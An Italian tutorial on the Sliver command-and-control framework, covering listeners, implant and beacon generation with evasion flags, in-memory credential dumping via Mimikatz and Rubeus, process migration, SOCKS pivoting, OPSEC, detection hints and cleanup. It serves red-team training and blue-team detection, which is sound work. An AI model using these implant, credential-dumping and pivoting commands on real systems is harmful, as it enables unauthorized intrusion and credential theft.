---
title: 'Sliver C2: guida a listener, beacon, implant e Armory'
slug: silver
description: >-
  Configura Sliver C2 per il Red Team: installazione, listener mTLS/HTTP/DNS,
  implant, beacon e sessioni, Armory, BOF, pivoting, OPSEC, detection e cleanup.
image: /sliver-c2-horror-red-team.webp
draft: false
date: 2026-08-24T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - Sliver C2
  - Red Team
  - Beacon
  - Armory
  - BOF
  - mTLS
---

# Sliver C2: Dai Listener ai Beacon, la Guida Completa al Framework Red Team

**Sliver** è un framework C2 (Command & Control) open source scritto in Go, sviluppato da Bishop Fox: genera implant multi-piattaforma (Windows/Linux/macOS) e li gestisce da una console centralizzata, con supporto a beacon, sessioni interattive, pivoting e moduli di post-exploitation.

Cobalt Strike costa migliaia di euro l'anno in licenza. Sliver offre gran parte delle stesse capacità — C2 multi-protocollo, implant multi-piattaforma, post-exploitation — gratis e open source. Sliver è oggi uno dei framework C2 open source più utilizzati nei laboratori di penetration testing, nei training red team e negli engagement autorizzati: la sua architettura multipiattaforma e il supporto a sessioni, beacon, pivoting e moduli post-exploitation lo rendono particolarmente interessante per chi studia C2 e adversary simulation, incluso chi prepara l'OSEP.

**Nota per chi arriva da un'ottica difensiva:** Sliver non è solo un tool da lab. Essendo open source e gratuito, viene usato anche da threat actor reali — è stato osservato ad esempio come payload successivo al loader BumbleBee, e gruppi come APT29 lo hanno usato in campagne reali. Se lavori lato blue team, conoscerne il funzionamento offensivo (questa guida) è quello che ti serve per riconoscerlo.

**Quando usarla:** red team autorizzato, lab HTB/ProLab, preparazione OSEP, ambienti di test personali.
**Cosa copre:** installazione, listener (mTLS/HTTP/DNS/WireGuard), generazione implant, beacon vs sessioni, post-exploitation, Armory.
**Cosa non copre:** evasion avanzata da EDR e hardening dell'infrastruttura C2 (domain fronting, redirector avanzati) — argomenti per un articolo dedicato.

**Versione testata:** i comandi Sliver cambiano tra release. Verifica la tua versione con `sliver-server version` e controlla sempre `help`/`<comando> --help` prima di affidarti ciecamente a un flag di questa guida.

***

## Prerequisiti

* Linux (Kali o altra distro), accesso root/sudo
* `mingw-w64` se devi compilare implant Windows da un server Linux
* Una macchina Windows/Linux/macOS di laboratorio (HTB, ProLab, VM personale)
* Connettività di rete tra Teamserver e target
* Autorizzazione esplicita all'esecuzione dell'implant sul target

Tutti gli esempi di questa guida usano IP di laboratorio (`10.10.14.5`). Sostituiscilo con l'indirizzo del tuo Teamserver nel tuo ambiente autorizzato.

***

## Fase 0 — Capire la logica prima dei comandi

Un'infrastruttura Sliver ha quattro pezzi che devono combaciare:

```
Operator
   │
   ▼
Sliver Client (console dell'operatore)
   │
   ▼
Sliver Teamserver (sliver-server, mantiene stato e sessioni)
   │
   ├── Listener (mTLS / HTTP / DNS / WireGuard)
   │
   └── Implant → si connette al listener → Target
```

1. **Operator** — la persona che comanda, opera tramite `sliver-client`
2. **Teamserver** — dove gira `sliver-server`, riceve le connessioni e mantiene lo stato dell'engagement
3. **Listener** — il protocollo in ascolto sul Teamserver (mTLS, HTTP, DNS, WireGuard)
4. **Implant** — il binario che gira sulla macchina target e si connette al listener

Client e server possono girare sulla stessa macchina (setup da lab) oppure essere separati, con più operatori collegati allo stesso Teamserver (vedi sezione Multiplayer più avanti).

L'errore più comune da principiante: generare un implant con un protocollo e provare a catturarlo con un listener di un protocollo diverso, o su IP/porta diversi da quelli compilati nel binario. Devono coincidere esattamente.

***

## Fase 1 — Installazione

```bash
curl https://sliver.sh/install | sudo bash
```

Per compilare implant Windows da un server Linux, serve il compilatore MinGW:

```bash
sudo apt install mingw-w64
```

Verifica che l'installazione sia andata a buon fine:

```bash
sliver-server version
```

Avvio del server (apre la console interattiva):

```bash
sliver-server
```

***

## Fase 2 — Listener: mettersi in ascolto

Sliver supporta 4 protocolli:

| Protocollo     | Quando usarlo                                                                                                                                                                                                                          |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **mTLS**       | cifrato, autenticazione reciproca certificato-based                                                                                                                                                                                    |
| **HTTP/HTTPS** | pensato per confondersi nel traffico web, utile contro egress filtering aggressivo                                                                                                                                                     |
| **DNS**        | funziona anche quando solo la 53 è aperta in uscita, ma è il più lento e "finicky" da configurare — stesso principio di [Iodine/Dnscat2 su DNS Pivoting](https://hackita.it/articoli/dns-pivoting), ma integrato nativamente in Sliver |
| **WireGuard**  | crea di fatto una VPN leggera, raccomandato dagli sviluppatori per stabilità                                                                                                                                                           |

```bash
# Listener mTLS sulla porta di default
sliver > mtls

# Listener HTTP sulla porta 80
sliver > http

# Listener HTTPS con certificato personalizzato
sliver > https --lhost 10.10.14.5 --lport 443 --cert /path/to/cert.crt --key /path/to/key.key

# Listener DNS — il tuo dominio deve avere i record NS che puntano al Teamserver
sliver > dns --domains lab.local

# Listener WireGuard
sliver > wg --lport 51820

# Verifica i listener attivi
sliver > jobs
```

`jobs` mostra tutto quello che gira sul server, non solo i listener ma anche eventuali web host per la delivery. L'output tipico è una tabella con ID, nome, protocollo e porta — il formato esatto può variare leggermente tra versioni.

Per DNS serve che tu controlli una zona DNS delegata al Teamserver (i record NS del dominio devono puntare al tuo IP); per WireGuard il target deve poter raggiungere la porta UDP configurata. Entrambi vanno testati in lab prima di un engagement reale.

### HTTPS vs mTLS — quando usare quale

Sono entrambi cifrati, ma il contesto cambia:

* **mTLS** → autenticazione reciproca tra client e server (il server autentica anche il beacon). Il certificato Sliver auto-generato ha però un pattern riconoscibile che un difensore può cercare specificamente.
* **HTTPS con cert custom** → il beacon autentica il server tramite un certificato legittimo. Il traffico può inserirsi in un flusso HTTPS normale, ma **TLS non rende il traffico automaticamente indistinguibile** dal traffico web ordinario: un EDR/NDR può comunque analizzare SNI, certificato, JA3/JA4, JARM, destinazione, frequenza e dimensione dei pacchetti, URI, User-Agent e periodicità.

***

## Fase 3 — Generare un implant

```bash
sliver > generate --mtls 10.10.14.5:443 --os windows --arch amd64 --save /home/kali/implant.exe
```

Ogni parametro ha uno scopo preciso:

* `--mtls 10.10.14.5:443` — il listener a cui l'implant tenterà di connettersi, deve combaciare con quello avviato in Fase 2
* `--os` / `--arch` — piattaforma target, Sliver compila cross-platform da un'unica macchina
* `--save` — dove salvare il binario compilato

Per scoprire tutti i flag disponibili nella tua versione, non fidarti a memoria della guida — controlla sempre:

```bash
sliver > generate --help
sliver > generate beacon --help
```

Dopo la generazione, verifica che il file esista davvero prima di passare alla delivery:

```bash
ls -lh /home/kali/implant.exe
file /home/kali/implant.exe
sha256sum /home/kali/implant.exe
```

L'hash è utile in lab anche solo per tracciare quale build hai effettivamente eseguito sul target, in caso di troubleshooting.

### Flag avanzati che vale la pena conoscere

```bash
sliver > generate beacon --mtls 10.10.14.5:443 --os windows --arch amd64 \
  --format exe --evasion --skip-symbols --name test-lab
```

* `--format` — formato di output (`exe`, `shared` per DLL, `service`, `shellcode`)
* `--evasion` — abilita le opzioni di evasione previste dalla build di Sliver. **Non è una garanzia di bypass** di AV/EDR moderni, è un livello di offuscamento in più da verificare caso per caso
* `--skip-symbols` — rimuove simboli di debug dal binario, riduce il footprint statico
* `--debug` — build con log verboso, utile solo in lab per capire perché qualcosa non funziona, mai in un engagement reale
* `--name` — nome interno dell'implant, altrimenti Sliver genera un nome casuale
* `--canary` — inserisce domini "civetta" nel binario (vedi sezione Canary più sotto)

### Formati di output — quale scegliere

| Formato               | Quando usarlo                                                            |
| --------------------- | ------------------------------------------------------------------------ |
| `exe`                 | esecuzione diretta classica, il caso più comune                          |
| `shared` (DLL)        | DLL sideloading o injection in un processo esistente                     |
| `service`             | persistenza come Windows Service                                         |
| `shellcode`           | da inserire in un exploit esistente o iniettare in memoria con un loader |
| shared object (Linux) | equivalente della DLL su target Linux                                    |
| macho                 | target macOS                                                             |

### Stageless vs Staged — cosa genera davvero `generate`

Per default, `generate` produce un implant **stageless**: tutto il codice (comunicazione + funzionalità) è già dentro il binario che droppi sul target, un solo file, nessuna seconda fase di download.

Un implant **staged** funziona diversamente: droppi sul target uno stager piccolissimo, che si connette al Teamserver e scarica il resto del payload solo in un secondo momento, in memoria. Sliver supporta anche questa modalità (stager HTTP(S), compatibili anche con stager Metasploit).

Perché la differenza conta:

* **Stageless** → più semplice da gestire, ma il binario è più grande e porta con sé tutto il codice fin da subito (più superficie per l'analisi statica di un AV)
* **Staged** → il primo file droppato è minuscolo e innocuo all'apparenza, il payload vero arriva dopo via rete — ma questo secondo "salto" di rete è a sua volta un evento osservabile da chi monitora il traffico

Nella maggior parte dei lab e degli esempi di questa guida (incluso `generate --mtls ...`) stiamo generando implant stageless, che è anche il default più semplice per iniziare.

### Sessione vs Beacon — la scelta che cambia tutto

```bash
# Implant a sessione: connessione persistente, interattiva in tempo reale
sliver > generate --mtls 10.10.14.5:443 --os windows

# Implant beacon: check-in periodico
sliver > generate beacon --mtls 10.10.14.5:443 --os windows --seconds 60 --jitter 30
```

Differenza visiva:

```
SESSIONE
Target ──────────────── Teamserver
       connessione interattiva costante

BEACON
Target ── check-in ──► Teamserver
Target ◄── task ────── Teamserver
       ...attesa...
Target ── check-in ──► Teamserver
```

Una **sessione** mantiene una connessione aperta — comoda per operare in tempo reale, ma genera traffico di rete costante e riconoscibile. Un **beacon** si connette solo a intervalli (qui un intervallo nominale di 60 secondi con variazione introdotta dal parametro `--jitter`; il comportamento esatto del jitter va verificato sulla versione di Sliver che usi), esegue i task in coda, e si disconnette.

**Attenzione:** beacon non significa automaticamente "stealth". Riduce la *frequenza* della comunicazione, ma il comportamento complessivo dell'implant — process injection, chiamate di sistema, artefatti lasciati sul disco o in memoria — può comunque essere rilevato.

**Regola pratica da red teamer:** beacon per la persistenza a lungo termine dove la detection conta; sessione quando serve interazione rapida e sei disposto a scambiare un po' di stealth per comodità operativa.

### Tutto a colpo d'occhio

| Aspetto        | Sessione                     | Beacon                               |
| -------------- | ---------------------------- | ------------------------------------ |
| Connessione    | persistente                  | check-in periodico                   |
| Interattività  | tempo reale                  | asincrona, in coda                   |
| Rumore di rete | costante, riconoscibile      | intermittente, con jitter            |
| Uso tipico     | operazioni rapide, demo, lab | persistenza reale, engagement lunghi |

| Protocollo | Velocità | Note                                                                             |
| ---------- | -------- | -------------------------------------------------------------------------------- |
| mTLS       | alta     | scelta di default per affidabilità e cifratura autenticata                       |
| HTTP/HTTPS | media    | può confondersi in un flusso web, ma resta analizzabile via metadata/fingerprint |
| DNS        | bassa    | utile quando solo la 53 è aperta, spesso instabile                               |
| WireGuard  | alta     | raccomandato dagli sviluppatori per stabilità                                    |

### Sliver vs altri C2 — quando sceglierlo

| Framework     | Punto forte                                                   | Quando preferirlo a Sliver                                                          |
| ------------- | ------------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| Cobalt Strike | ecosistema di terze parti maturo, standard enterprise da anni | budget aziendale disponibile, serve supporto commerciale                            |
| Mythic        | architettura a plugin molto flessibile, multi-agente          | engagement con esigenze di agent custom specifici                                   |
| Covenant      | basato su .NET, buona integrazione con tooling C#             | team già specializzato nell'ecosistema .NET/PowerShell                              |
| Havoc         | focus dichiarato su stealth/evasion, interfaccia moderna      | vuoi un'alternativa gratuita più orientata all'evasion out-of-the-box               |
| AdaptixC2     | più recente, molto modulare, GUI multiplayer curata           | progetto in rapida crescita 2025-2026, da valutare se vuoi restare sull'ultima onda |

Sliver resta una scelta solida quando serve gratuito, open source, e sufficientemente completo senza vincoli di licenza — motivo per cui è oggi diffuso nei lab OSEP. Per chi vuole approfondire caso per caso ogni sottosistema (generation, transport, evasion), la [serie Sliver C2 Deep Dive](https://medium.com/@maverickcx64/sliver-c2-deep-dive-a-comprehensive-command-control-framework-series-4f8ba55f7a45) è un buon complemento pratico a questa guida, scritta da chi lo usa quotidianamente in campo.

### Profili — non riscrivere gli stessi flag ogni volta

```bash
sliver > profiles new beacon --mtls 10.10.14.5:443 --os windows --arch amd64 --seconds 60 --jitter 30 profilo-lab
sliver > profiles generate profilo-lab
```

I profili sono utili quando un engagement richiede più implant con caratteristiche omogenee: evitano errori di configurazione e rendono riproducibile la generazione — un comando invece di riscrivere 5 flag ogni volta.

### Canary — sapere se il tuo implant è stato scoperto

Sliver ha una feature poco conosciuta ma utile: i **canary**, domini "civetta" che generi insieme all'implant con `--canary <dominio>`. Il dominio viene incorporato nel binario ma non viene mai risolto durante il normale funzionamento — l'unico modo per cui qualcuno lo risolva è aprire il binario in un sandbox AV, un debugger, o analizzarlo manualmente.

```bash
sliver > canaries
```

Se un canary risulta "triggerato", significa che qualcuno (un AV in sandbox, un analista blue team) ha aperto il tuo implant fuori dal contesto previsto — un segnale di allerta operativo, utile tanto in un red team reale quanto per capire in lab come funziona il meccanismo prima di incontrarlo in un CTF/box più avanzato.

***

## Fase 4 — Catturare la connessione e operare

Dopo aver eseguito l'implant sul target, verifica l'arrivo:

```bash
sliver > sessions
sliver > beacons
```

Interagisci con una sessione specifica:

```bash
sliver > use <session-id>
```

Quando non ricordi un comando o i suoi flag, non tirare a indovinare:

```bash
sliver > help
sliver > help <comando>
sliver (implant) > info
```

Comandi base una volta dentro — concettualmente vicini a un Meterpreter, se hai familiarità con Metasploit:

```bash
sliver (implant) > whoami
sliver (implant) > ps
sliver (implant) > netstat
sliver (implant) > getprivs
sliver (implant) > getsystem
```

`getsystem` tenta tecniche di privilege escalation automatica per ottenere un contesto SYSTEM; il metodo effettivamente usato dipende dalla versione di Sliver e dalle condizioni del target, e non è garantito che funzioni.

### Su un beacon, i comandi sono in coda, non immediati

```bash
sliver (beacon) > tasks
sliver (beacon) > tasks fetch <task-id>
```

Un comando lanciato su un beacon non risponde subito: viene accodato e recuperato al prossimo check-in. `tasks` mostra la coda, `tasks fetch` recupera il risultato quando disponibile.

### Pivoting — raggiungere host non esposti direttamente

```bash
sliver (implant) > socks5 start
sliver (implant) > portfwd add --remote 192.168.1.5:445 --local 127.0.0.1:8445
```

Due logiche diverse:

```
SOCKS5                              PORT FORWARD
Attacker                            127.0.0.1:8445
   │                                       │
   ▼                                       ▼
Proxy SOCKS via implant             Compromised host
   │                                       │
   ▼                                       ▼
Compromised host                    192.168.1.5:445
   ├── 10.10.10.10:445
   ├── 10.10.10.20:389
   └── 10.10.10.30:80
```

`socks5` apre un proxy attraverso l'implant per instradare **qualsiasi tool** ([Impacket](https://hackita.it/articoli/impacket), nmap) verso tutta la rete interna raggiungibile dal compromised host. `portfwd` inoltra **una singola porta specifica** — più chirurgico, utile quando ti serve raggiungere un solo servizio (es. SMB) senza aprire un proxy generico. Per la teoria approfondita, vedi [Pivoting su HackIta](https://hackita.it/articoli/pivoting).

### Loot — raccogliere e conservare artefatti

```bash
sliver (implant) > download C:\Users\admin\Desktop\file.txt
sliver (implant) > upload ./tool.exe C:\Windows\Temp\tool.exe
sliver (implant) > screenshot
sliver > loot
```

`loot` tiene traccia centralizzata di tutto quello che hai scaricato durante l'engagement — comodo per il report finale invece di rincorrere file sparsi su disco. Il loot può contenere credenziali, token e documenti sensibili: in un engagement reale va conservato secondo le regole di gestione delle evidenze definite nello scope, non lasciato in chiaro sull'attacker box.

***

## Fase 5 — Armory: estendere le capacità

L'Armory è il package manager di Sliver per tool di terze parti (BOF, tooling .NET tipo Ghostpack):

```bash
sliver > armory search
```

Installazione mirata di un singolo modulo — meglio che installare tutto indiscriminatamente:

```bash
sliver > armory install rubeus
```

Evita `armory install all` su un ambiente reale salvo necessità specifica: installare numerosi moduli in blocco aumenta la superficie operativa e rende più difficile sapere, in retrospettiva, quali componenti sono stati effettivamente usati durante l'engagement.

Uso di un modulo installato su un implant attivo:

```bash
sliver (implant) > rubeus kerberoast
sliver (implant) > mimikatz -command "sekurlsa::logonpasswords"
```

Questo è dove Sliver diventa davvero utile in un contesto [Active Directory su HackIta](https://hackita.it/articoli/active-directory): stessi tool che conosci da [Mimikatz su HackIta](https://hackita.it/articoli/mimikatz) e da Rubeus, eseguiti in-memory tramite l'implant invece che droppati su disco. Il [Kerberoasting su HackIta](https://hackita.it/articoli/kerberoasting) è uno dei task principali una volta che hai una sessione valida. Per l'enumerazione iniziale del dominio, integra anche [BloodHound su HackIta](https://hackita.it/articoli/bloodhound).

**Attenzione prima di installare moduli di terze parti:** l'Armory include contributi della community, non solo del team Sliver. Verifica sempre il codice sorgente di un'estensione prima di usarla in un engagement reale.

### Alias vs estensioni vs Armory — chi è chi

* **Armory** — il package manager, il modo in cui installi tutto il resto
* **Alias** — un wrapper che esegue un programma esistente (es. Seatbelt) dentro il processo dell'implant via `execute-assembly`/`sideload`, senza spawnare un nuovo processo
* **Estensione** — una shared library caricata direttamente nell'implant, più integrata ma con eventuali dipendenze aggiuntive

In pratica: l'Armory è il negozio, alias ed estensioni sono i due tipi di prodotto che ci trovi dentro.

**Un livello sopra l'Armory:** Sliver espone anche un'API di scripting (Python e JavaScript/TypeScript) che parla direttamente col Teamserver via gRPC. Mentre Armory/alias/estensioni estendono cosa può fare l'implant, lo scripting automatizza l'operatore stesso — utile per workflow ripetitivi (es. generare e distribuire implant su più target in automatico) più che per il singolo comando manuale.

### BOF — Beacon Object File

Un **BOF (Beacon Object File)** è un frammento di codice compilato (C, Assembly, o Go) eseguito direttamente dentro il processo dell'implant tramite un runtime in-memory. Non è un eseguibile standalone, ma un object file (`.o` su Linux/macOS, `.obj` su Windows).

```bash
sliver > armory install sharphound
sliver (implant) > sharphound
```

Vantaggi reali dei BOF, senza esagerare:

* L'esecuzione in memoria può evitare il normale drop dell'artefatto sul filesystem — ma non significa assenza di tracce: memoria, telemetria EDR, chiamate API e telemetria di rete possono comunque essere osservate
* Può evitare alcuni eventi associati alla creazione di un processo figlio, ma non elimina le possibilità di detection comportamentale
* Comandi operativi comuni: enumerazione AD con SharpHound, credential dumping via estensioni, syscall diretti

BOF è un argomento avanzato — non tutti gli ambienti richiedono la compilazione custom di un BOF, ma è bene sapere che Sliver li supporta.

***

## Multiplayer — più operatori sullo stesso engagement

```bash
sliver-server > multiplayer
sliver-server > new-operator --name operatore2 --lhost 10.10.14.5
```

```
Operator 1 ──┐
              ├──► Teamserver (stato condiviso: sessioni, beacon, loot)
Operator 2 ──┘
```

Il comando `new-operator` genera un file di configurazione con certificato client che l'altro operatore importa nel proprio `sliver-client`. Ogni operatore vede lo stesso stato condiviso — sessioni, beacon, loot — e il Teamserver mantiene log lato server delle azioni eseguite, con l'operatore che le ha lanciate: utile per audit interno del team in ambienti multiplayer dove serve sapere chi ha fatto cosa.

I log e i dati persistenti vengono conservati nella directory di configurazione usata dal Teamserver (tipicamente sotto la home dell'utente che esegue `sliver-server`); il percorso esatto può dipendere da versione e configurazione — verificalo nella tua installazione invece di assumerlo.

***

## Migration e Process Injection — spostarsi tra processi

Quando hai un beacon o una sessione su un target, spesso serve spostarti da un processo all'altro per continuare a operare senza dipendere dal processo originario.

Perché migrare:

* il processo originale è instabile o sta per essere terminato
* serve un contesto di sicurezza diverso
* vuoi continuare l'operazione anche se il processo iniziale (es. un documento Office che ha eseguito il payload) viene chiuso dall'utente

```bash
sliver (implant) > spawn
sliver (implant) > migrate <pid>
sliver (implant) > execute-assembly <path-to-binary>
sliver (implant) > sideload <path-to-dll>
```

* `spawn` — genera un nuovo processo figlio e inietta il beacon dentro
* `migrate <pid>` — trasferisce il beacon in un processo esistente
* `execute-assembly` — carica un binario .NET in-memory senza droppare su disco (funziona per tool C# tipo Rubeus, Seatbelt)
* `sideload` — carica una DLL dentro il processo implant, utile per tool che richiedono una DLL

**Migrazione ≠ privilege escalation.** Spostare un implant in un altro processo non garantisce automaticamente privilegi maggiori: il token e il contesto di sicurezza del processo di destinazione sono quelli che determinano cosa puoi fare dopo la migrazione, non l'azione di migrare in sé.

***

## Cleanup: chiudere tutto a fine test

In un lab o in un engagement, lasciare listener attivi e implant sul target è una cattiva pratica — sia per igiene operativa che perché un implant dimenticato resta una porta aperta.

```bash
sliver (implant) > kill
sliver > jobs
sliver > jobs -k <job-id>
rm /home/kali/implant.exe
```

Su un host di test/lab, verifica anche che non restino artefatti sul target (file droppati, entry di persistenza create con moduli Armory) prima di considerare il test concluso — in un red team autorizzato, il cleanup fa parte del deliverable tanto quanto il report.

***

## Lab completo end-to-end

Scenario minimo per mettere insieme tutti i pezzi in laboratorio:

```
ATTACKER (10.10.14.5)
     │ mTLS :443
     ▼
SLIVER TEAMSERVER
     │
     ▼
TARGET WINDOWS DI LAB (10.10.10.20)
```

```
[ ] 1. sliver-server → avvia Teamserver
[ ] 2. mtls → avvia listener
[ ] 3. generate beacon --mtls 10.10.14.5:443 --os windows → genera implant
[ ] 4. trasferisci l'implant al target (delivery, fuori scope Sliver)
[ ] 5. esegui l'implant sul target
[ ] 6. beacons → verifica il check-in
[ ] 7. use <id> → interagisci
[ ] 8. whoami / ps / getprivs → enumerazione base
[ ] 9. socks5 start / portfwd → pivoting se serve raggiungere altri host
[ ] 10. kill / jobs -k → cleanup
```

***

## Quando NON usare Sliver — scegli lo strumento giusto

Sliver è potente, ma non è sempre la scelta migliore. Prima di compilare un beacon, valuta se il task richiede davvero un C2 persistente:

| Scenario                                 | Usa invece di Sliver                                                                                      | Motivo                                                     |
| ---------------------------------------- | --------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
| Un singolo comando remoto su SMB/WinRM   | [Impacket](https://hackita.it/articoli/impacket) (`wmiexec.py`, `smbexec.py`)                             | Nessuna compilazione, zero binari, footprint minimo        |
| Credential validation veloce su più host | [NetExec](https://hackita.it/articoli/netexec) o [CrackMapExec](https://hackita.it/articoli/crackmapexec) | Specificamente progettato per questo, più veloce di Sliver |
| Shell interattiva uno-a-uno su WinRM     | Evil-WinRM                                                                                                | Più lean, meno setup, sufficiente per lab                  |
| Persistenza minima senza C2              | Task schedulati, entry di registro, SharpPersist                                                          | Non serve overhead C2, target-specific                     |
| Enumerazione rapida AD senza beacon      | [BloodHound](https://hackita.it/articoli/bloodhound) (SharpHound) locale                                  | Raccolgono dati senza mantenere persistenza                |

**Sliver ha senso quando:**

* Serve gestione centralizzata di **più host simultaneamente**
* Pianifichi **post-exploitation strutturato** con moduli (Armory, BOF)
* Hai **più operatori** che lavorano in parallelo (multiplayer)
* Engagement **lungo termine** dove il check-in periodico del beacon conta
* Dopo una prima compromise, serve **lateral movement articolato** via SOCKS/portfwd

***

## OPSEC e Network Visibility

Non esiste un protocollo o una configurazione "universalmente stealth" — conta il contesto di rete e la telemetria dell'ambiente.

### Lato Red Team

* Jitter alto sul beacon riduce la prevedibilità del pattern di check-in rispetto a un intervallo fisso
* La scelta del protocollo (mTLS/HTTP/DNS/WireGuard) va valutata sul contesto di rete, non su un'etichetta generica di "più silenzioso"
* Una porta comune (443) non rende automaticamente legittimo il traffico: un processo sospetto che apre una connessione outbound su 443 verso un IP VPS con un TLS fingerprint anomalo resta rilevabile
* Rotazione di protocolli/porte tra engagement diversi: i difensori costruiscono firme su pattern ricorrenti
* Esecuzione in-memory via Armory (execute-assembly, sideload) dove possibile, per ridurre il footprint su disco rispetto al droppare binari compilati (vedi anche [LOLBins su HackIta](https://hackita.it/articoli/lolbins) per alternative con tool nativi)

Un **redirector** (VPS/proxy intermedio davanti al Teamserver) non rende il C2 invisibile: aggiunge un livello intermedio e riduce l'esposizione diretta del Teamserver, ma il traffico tra redirector e target resta comunque osservabile lato host/rete.

```
Beacon → Redirector → Teamserver
```

### Lato Blue Team

* Anomalie nei certificati TLS: Sliver genera certificati custom con pattern potenzialmente riconoscibili
* Fingerprint JA3/JA4/JARM del traffico cifrato
* Metadata HTTP (URI, User-Agent, periodicità delle richieste)
* Query DNS anomale, se il listener usato è DNS
* Pattern di process injection e relazioni padre-figlio insolite, non solo signature statiche
* Porte non standard note come default Sliver (es. UDP/51820 per WireGuard), se non sono state rimappate

***

## Troubleshooting

### L'implant non si connette al listener

Controlla in ordine:

```
1. Listener attivo? (jobs)
2. IP corretto?
3. Porta corretta?
4. Protocollo corretto? (deve combaciare tra generate e listener)
5. Routing tra target e Teamserver?
6. Firewall in uscita sul target?
7. DNS risolto correttamente (se listener DNS)?
8. Il target raggiunge davvero il Teamserver?
9. L'implant è stato eseguito?
10. Il Teamserver riceve traffico?
```

Sul Teamserver:

```bash
sliver > jobs
ss -lntp
sudo tcpdump -ni any port 443
```

Sul target (Windows):

```powershell
Test-NetConnection 10.10.14.5 -Port 443
```

### Tabella errori comuni

| Errore                                                         | Cosa controllare                                                                                                           |
| -------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| L'implant non si connette al listener                          | IP/porta/protocollo devono combaciare esattamente tra `generate` e il listener avviato                                     |
| Sessione HTTP non si apre su un beacon compilato solo con mTLS | un beacon può aprire connessioni solo sui protocolli con cui è stato compilato                                             |
| Implant Windows non compila da Linux                           | manca `mingw-w64`, necessario per il cross-compiling                                                                       |
| Il beacon non risponde subito ai comandi                       | comportamento atteso — aspetta il prossimo check-in, controlla `tasks`                                                     |
| Listener non parte, porta già in uso                           | verifica con `jobs` se un listener precedente è rimasto attivo, o controlla conflitti con altri servizi sulla stessa porta |
| Firewall del target blocca la connessione in uscita            | verifica quali porte sono aperte in egress — prova HTTP sulla 80/443 se mTLS su porte non standard è bloccato              |
| `armory install` fallisce o si blocca                          | controlla la connettività verso GitHub dal server Sliver, l'Armory scarica i moduli da lì                                  |

***

## Hardening rapido (lato difensivo)

* **Monitora le porte non standard** — TCP/8888 (mTLS) e UDP/51820 (WireGuard) sono i default Sliver, spesso lasciati invariati
* **Analizza anomalie nei certificati TLS** — Sliver genera certificati custom con pattern riconoscibili
* **EDR con detection comportamentale** — cerca pattern di process injection e relazioni padre-figlio insolite, non solo signature statiche
* **Windows Security logs, Sysmon e PowerShell logging** — se l'implant arriva a DCSync, dump di credenziali o esecuzione .NET in-memory, restano comunque tracce lato Windows indipendentemente dal C2 usato
* **Network telemetry e DNS logs** — utili anche contro listener DNS/WireGuard
* (In infrastrutture cloud AWS, aggiungi CloudTrail all'audit — non è però un log Windows e va tenuto separato dal resto di questa lista)

***

## Architettura Sliver e Workflow operativo

### Componenti dell'infrastruttura

```
Operator (Red Teamer) con sliver-client
            ↓ (SSH / VPN)
Sliver Teamserver (sliver-server + DB)
            ↓
Listener (mTLS/HTTP/DNS/WireGuard)
            ↓
[Opzionale: Redirector/VPS intermediario per celare il Teamserver vero]
            ↓
Network (Internet o Intranet)
            ↓
Target Host (beacon/sessione Sliver)
```

### Flusso operativo step-by-step

```
[ ] 1. Setup Teamserver (sliver-server + listener)
[ ] 2. Generazione implant (beacon o sessione)
[ ] 3. Delivery (phishing, exploit, USB — fuori scope Sliver)
[ ] 4. Connessione al listener
[ ] 5. Interazione (use <id>, comandi, enumeration)
[ ] 6. Lateral Movement (SOCKS, portfwd, pivoting)
[ ] 7. Cleanup (kill, rimozione file, chiusura listener)
```

***

## Sliver e MITRE ATT\&CK: perché il C2 non è una tecnica

Sliver è uno **strumento**; la tecnica ATT\&CK dipende dal **comportamento** eseguito tramite lo strumento, non dal semplice fatto di usare Sliver. Usare Sliver non equivale automaticamente a T1055 o T1027 — dipende da cosa fai una volta dentro (injection? no? execute-assembly in-memory? dump di credenziali?).

| Tattica              | Tecnica                                   | Quando si applica              |
| -------------------- | ----------------------------------------- | ------------------------------ |
| Command and Control  | T1071 — Application Layer Protocol        | listener HTTP/DNS              |
| Command and Control  | T1573 — Encrypted Channel                 | listener mTLS/WireGuard        |
| Command and Control  | T1090 — Proxy                             | uso di un redirector           |
| Execution            | T1059 — Command and Scripting Interpreter | esecuzione comandi via implant |
| Privilege Escalation | T1055 — Process Injection                 | `spawn`, `migrate`, `sideload` |
| Defense Evasion      | T1027 — Obfuscated Files or Information   | `--evasion`, `--skip-symbols`  |
| Credential Access    | T1003 — OS Credential Dumping             | moduli Armory tipo Mimikatz    |
| Lateral Movement     | T1021 — Remote Services                   | pivoting via SOCKS/portfwd     |

Per un confronto approfondito tra Sliver e gli altri framework C2 (Mythic, Havoc, Empire, ecc.), la [scheda di C2 Matrix su Sliver](https://howto.thec2matrix.com/c2/sliver) è una risorsa di settore meno mainstream ma parecchio usata da chi valuta quale C2 adottare in un lab.

***

## Cheat Sheet comandi

Non una lista muta: ogni comando con cosa fa, così la usi anche senza aver letto tutto l'articolo.

**Server**

| Comando       | Cosa fa                                              |
| ------------- | ---------------------------------------------------- |
| `jobs`        | mostra listener e servizi attivi sul Teamserver      |
| `operators`   | elenca gli operatori connessi (utile in multiplayer) |
| `multiplayer` | attiva la modalità multi-operatore                   |
| `sessions`    | elenca le sessioni interattive attive                |
| `beacons`     | elenca i beacon attivi                               |

**Generazione**

| Comando             | Cosa fa                                                           |
| ------------------- | ----------------------------------------------------------------- |
| `generate`          | crea un implant a sessione                                        |
| `generate beacon`   | crea un implant a beacon (check-in periodico)                     |
| `profiles new`      | salva una combinazione di parametri di generazione riutilizzabile |
| `profiles generate` | genera un implant da un profilo già salvato                       |

**Interazione**

| Comando    | Cosa fa                                                          |
| ---------- | ---------------------------------------------------------------- |
| `use <id>` | entra in una sessione/beacon specifico                           |
| `info`     | mostra i dettagli dell'implant attivo (OS, PID, integrità, ecc.) |
| `help`     | elenca i comandi disponibili nella tua versione                  |

**Post-exploitation**

| Comando     | Cosa fa                                         |
| ----------- | ----------------------------------------------- |
| `whoami`    | utente con cui gira l'implant                   |
| `ps`        | elenca i processi sul target                    |
| `netstat`   | connessioni di rete attive sul target           |
| `getprivs`  | privilegi/token disponibili all'utente corrente |
| `getsystem` | tenta l'escalation a SYSTEM (non garantita)     |

**Pivot**

| Comando        | Cosa fa                                                                    |
| -------------- | -------------------------------------------------------------------------- |
| `socks5 start` | apre un proxy SOCKS attraverso l'implant verso tutta la rete raggiungibile |
